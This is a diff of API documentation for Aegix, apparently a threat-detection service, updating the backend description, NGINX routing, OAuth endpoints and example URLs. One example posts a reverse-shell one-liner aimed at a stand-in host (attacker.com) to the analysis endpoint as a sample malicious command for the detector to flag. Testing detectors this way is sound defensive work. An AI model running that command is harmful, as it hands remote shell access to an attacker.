@@ -6,14 +6,12 @@
 
 ## Overview
 
-The Aegix API is built with FastAPI and provides both synchronous HTTP endpoints and real-time WebSocket streaming for threat analysis.
+The Aegix API is built with Go and the Chi router, providing high-performance synchronous HTTP endpoints and real-time WebSocket streaming for threat analysis.
 
-The normal production flow is agent-driven: the endpoint agent keeps the backend running and forwards events automatically. The `/analyze` endpoint remains useful for manual testing, demos, and standalone analysis.
+The system is deployed using NGINX as a reverse proxy on Port 80, which routes all `/api/*` traffic to the backend on Port 8000.
 
-**Hugging Face Space**: `https://huggingface.co/spaces/Raphel3116/aegix_security`  
-**Local Base URL**: `http://localhost:8000`  
-**Docs**: `http://localhost:8000/docs` (Swagger UI)  
-**ReDoc**: `http://localhost:8000/redoc` (ReDoc UI)
+**Local Base URL**: `http://localhost/api`  
+*(Note: If bypassing NGINX, the backend runs directly on `http://localhost:8000`)*
 
 ---
 
@@ -50,6 +48,57 @@ GET /
   "version": "0.1.0",
   "events_stored": 42
 }
+```
+
+---
+
+### Authentication
+
+The Aegix API uses Google and GitHub OAuth 2.0 with HTTP-only cookies for secure session management.
+
+#### 1. OAuth Login (Google)
+
+Redirects the user to the Google consent screen.
+
+```http
+GET /auth/google/login
+```
+
+#### 2. OAuth Login (GitHub)
+
+Redirects the user to the GitHub consent screen.
+
+```http
+GET /auth/github/login
+```
+
+#### 3. Refresh Session
+
+Used by the React frontend on mount to restore the user session silently using the `refresh_token` HTTP-only cookie.
+
+```http
+POST /auth/refresh
+```
+
+**Response** (200 OK):
+```json
+{
+  "user": {
+    "id": 1,
+    "email": "user@example.com",
+    "name": "User Name",
+    "picture": "https://..."
+  },
+  "access_token": "eyJhbGciOiJIUzI1NiIs..."
+}
+```
+
+#### 4. Logout
+
+Clears the `refresh_token` HTTP-only cookie.
+
+```http
+POST /auth/logout
 ```
 
 ---
@@ -103,7 +152,7 @@ Content-Type: application/json
 
 Safe command (local):
 ```bash
-curl -X POST http://localhost:8000/analyze \
+curl -X POST http://localhost/api/analyze \
   -H "Content-Type: application/json" \
   -d '{"command":"ls -la /tmp"}'
 ```
@@ -129,7 +178,7 @@ curl -X POST https://<your-space-subdomain>.hf.space/analyze \
 
 Malicious command (local):
 ```bash
-curl -X POST http://localhost:8000/analyze \
+curl -X POST http://localhost/api/analyze \
   -H "Content-Type: application/json" \
   -d '{"command":"bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'
 ```
@@ -273,7 +322,7 @@ GET /stats
 
 **Example**:
 ```bash
-curl http://localhost:8000/stats | jq '.'
+curl http://localhost/api/stats | jq '.'
 ```
 
 ---
@@ -366,7 +415,7 @@ Stream real-time security events to connected clients.
 ### Connect
 
 ```
-ws://localhost:8000/ws
+ws://localhost/api/ws
 ```
 
 ### Message Format
